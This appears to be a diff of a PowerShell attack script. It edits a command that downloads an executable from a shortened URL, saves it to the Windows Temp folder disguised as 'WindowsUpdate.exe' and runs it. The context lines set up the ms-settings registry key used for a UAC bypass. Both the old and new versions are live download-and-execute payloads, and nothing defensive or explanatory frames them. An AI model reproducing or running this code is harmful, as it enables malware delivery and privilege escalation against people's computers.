@@ -1,4 +1,4 @@
-$program = 'cmd /c start powershell.exe -c "iwr -Uri ''https://tinyurl.com/28p8442s'' -Outfile ''C:\Windows\Temp\WindowsUpdate.exe''; Start-Process -FilePath ''C:\Windows\Temp\WindowsUpdate.exe'';"'
+$program = "iwr -Uri https://tinyurl.com/28p8442s -Outfile C:\Windows\Temp\WindowsUpdate.exe; Start-Process -FilePath C:\Windows\Temp\WindowsUpdate.exe;"
 
 #Create registry structure
 New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
